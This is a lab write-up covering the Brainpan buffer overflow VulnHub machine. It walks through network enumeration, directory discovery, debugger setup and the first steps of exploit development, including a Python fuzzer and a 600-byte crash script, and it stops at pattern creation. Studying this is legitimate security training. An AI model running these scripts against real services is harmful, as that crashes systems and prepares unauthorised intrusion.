# BrainPan BufferOverflow VulnHub Machine 
Hello! I am [Mohamed](https://twitter.com/0xMohomiester) This is My WriteUp for Brainpan BufferOverflow VulnHub Machine ok Let's start with download machine from [VulnHub Brainpan](https://www.vulnhub.com/entry/brainpan-1,51/) and setup it on vmware or virtual box as you like I already finished the setup you shoud see :

![brainp](https://user-images.githubusercontent.com/47929033/130876624-1b4dc000-bcb9-467c-87db-30b5ec3af179.png)

That's great Let's start with enumeration I need to now ip address of machine so i will use command 
`sudo netdiscover` to find ip address: 

![Screen Shot 2021-08-26 at 12 44 34 AM](https://user-images.githubusercontent.com/47929033/130876911-b5242212-661d-4646-989c-c8772a9b85d2.png)

as you can see the ip address: `192.168.1.6` with `vmware,inc` hostname now we need to perform port scanning I will use nmap to scan for open port and service on machinewith command:

`sudo nmap 192.168.1.6` : 

![Screen Shot 2021-08-26 at 12 48 27 AM](https://user-images.githubusercontent.com/47929033/130877152-5af6c1f5-28b4-4bc2-bc16-dc239560a2c5.png) 

as you can see two ports are open `9999,10000` let's check port `9999` with netcat using command 
`nc -nvv 192.168.1.6 9999`:

![Screen Shot 2021-08-26 at 12 49 00 AM](https://user-images.githubusercontent.com/47929033/130877337-dbaddc9d-fb3c-4a03-add2-ed49cbea2e7e.png)

as you can see this is the vulnerable service: `Brainpan`,maybe port `10000` is web server let's check it with open it in web browser: 

![Screen Shot 2021-08-26 at 12 49 20 AM](https://user-images.githubusercontent.com/47929033/130877350-d1d98332-3831-4c9b-a820-031966af52d9.png) 

That's Great, It's web server that run on port `10000` now we need to discover some interesting directories that hidden in webiste by using Gobuster using command: 
`gobuster dir  --url http://192.168.1.13:10000/  -w /home/kali/Desktop/directory-list-2.3-medium.txt`

![Screen Shot 2021-08-26 at 12 40 56 AM](https://user-images.githubusercontent.com/47929033/130877722-9c037be4-a6f8-4f5d-8e69-5cd6e10d891e.png)

as you can see i found directory `/bin` let me see in browser: 

![Screen Shot 2021-08-26 at 12 40 35 AM](https://user-images.githubusercontent.com/47929033/130877992-ccdee6c7-91a5-4197-8106-e54b5839a92c.png)

oh! it's e executable file now we need to switch to windows machine on vmware to run programe
i will tranfer the programe to windows machine and run it: 

![Screen Shot 2021-08-26 at 1 43 00 AM](https://user-images.githubusercontent.com/47929033/130878391-e18acbce-e348-4f65-b4a3-cbdb54794f49.png)

as you can see the programe listen on port 9999 and waitin for connection, we need [Immunity Debugger](https://debugger.immunityinc.com/) to open application and see how it works During exploition phase
I already download it , I will open and run it as administrator to attach service: 

![Screen Shot 2021-08-26 at 1 49 10 AM](https://user-images.githubusercontent.com/47929033/130878958-189b07db-6e2d-41bd-a594-fe77294799a0.png) 

as you can see service name: `Brainpan` with PID `2108` after attack it run programe from `F9` in your keyboard and make sure that the programe is running in the right down side: 

![Screen Shot 2021-08-26 at 1 49 38 AM](https://user-images.githubusercontent.com/47929033/130879173-18bcdd76-6286-44f6-836a-95ea16152d9a.png)

as you can see programe runing we need now to Discover bufferoverflow vulnerability using fuzzing in my Kali Linux attacking machine I written simple fuzzer using python: 

```
#!/usr/bin/python

import socket 

counter = 100

ip = "192.168.1.15"

port = 9999

while (counter<=5012):
      
     print("payload sent")

     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
     payload = 'A' * counter
   
     s.connect((ip, port))

     s.send(payload + "\r\n")
     
     s.recv(1024)
     
     s.close()
     
     counter+=100
    
     print(payload + "\n")

print(len(payload))
```

That's Great Let's run our fuzzer to Discover crash on application: 

![Screen Shot 2021-08-26 at 2 06 17 AM](https://user-images.githubusercontent.com/47929033/130880235-d06b1266-0fa1-40c3-8cfa-4f5e77a413b9.png) 

as you can see fuzzer stoped with string of `AAA` how to know number of `A` ? it's very simple let me to create a file with `touch aa.txt` and copy string to file and use command: `cat aa.txt | wc -c`:

![Screen Shot 2021-08-26 at 2 07 45 AM](https://user-images.githubusercontent.com/47929033/130880433-95cb1c84-9dcc-4192-b79b-173a7490b81c.png)

as you can see tha programe crased and EIP register: `41414141`

![Screen Shot 2021-08-26 at 2 06 32 AM](https://user-images.githubusercontent.com/47929033/130881445-09e4193f-8c01-4a6e-8116-6cbcea6d23fc.png)

The string that crased applicaton: `600` of `A`, That's Great now we can write a exploit to know which four bytes that OverWrtie `EIP`: 

## Hint : CTR+F2 to restart debugger ans service  and F9 to run service an debugger 

```
#!/usr/bin/python 
import socket 

buffer = 'A' * 600 

print 'payload sent'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

s.connect(('192.168.1.15',9999))

s.send(buffer + "\r\n")

s.recv(1024)

s.close()

```
I will run exploit to see the programe crash or not : 

![Screen Shot 2021-08-26 at 2 26 21 AM](https://user-images.githubusercontent.com/47929033/130881239-d8dcb070-d15a-480c-adfb-fd28dacba624.png)

as you can see the programe crashed Now, let's create a unique string with `msf-pattern-create`, using command: `msf-pattern_create -l 600` and copy the unique string to exploit to 









